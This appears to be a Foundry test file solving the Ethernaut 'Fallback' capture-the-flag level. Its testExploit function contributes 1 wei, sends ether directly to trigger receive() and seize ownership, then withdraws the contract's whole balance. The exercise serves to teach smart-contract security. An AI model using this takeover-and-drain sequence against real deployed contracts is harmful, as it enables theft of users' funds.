pragma solidity ^0.8.10;

import {FallbackFactory} from "../src/config/factories/1_FallbackFactory.sol";
import {Fallback} from "../src/1_Fallback/Fallback.sol";
import {Ethernaut} from "../src/config/Ethernaut.sol";
import "forge-std/Test.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    Fallback ethernautFallback;
    FallbackFactory fallbackFactory;

    address levelAddress;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);

        fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);

        vm.startPrank(eoaAddress);
        levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        ethernautFallback = Fallback(payable(levelAddress));
    }

    function testExploit() public {
        /** EXPLOIT START **/

        ethernautFallback.contribute{value: 1 wei}(); // (0/2): contribute to be able to evoke receive();
        payable(address(ethernautFallback)).call{value: 1 wei}(""); // (1/2): evoke receive(); to get owner
        ethernautFallback.withdraw(); // (2/2): withdraw to drain contract balance.

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}